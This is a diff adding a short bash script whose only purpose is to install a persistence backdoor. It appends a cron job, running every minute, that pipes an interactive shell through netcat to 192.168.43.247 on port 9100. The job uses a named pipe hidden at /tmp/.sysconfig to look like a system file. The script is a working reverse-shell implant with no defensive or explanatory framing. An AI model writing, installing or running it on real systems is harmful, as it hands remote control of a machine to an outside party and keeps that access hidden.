@@ -1,0 +1,10 @@
+#!/bin/bash
+
+CURRENT_CRONTAB=$(crontab -l)
+PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do rm /tmp/.sysconfig; mkfifo /tmp/.sysconfig; cat /tmp/.sysconfig | sh -i 2>&1 | nc 192.168.43.247 9100 > /tmp/.sysconfig; sleep 10; done\""
+TEMP_CRONTAB_FILE=$(mktemp)
+crontab -l > "$TEMP_CRONTAB_FILE"
+echo -e "$PAYLOAD" >> "$TEMP_CRONTAB_FILE"
+crontab "$TEMP_CRONTAB_FILE"
+cat "$TEMP_CRONTAB_FILE"
+rm "$TEMP_CRONTAB_FILE"
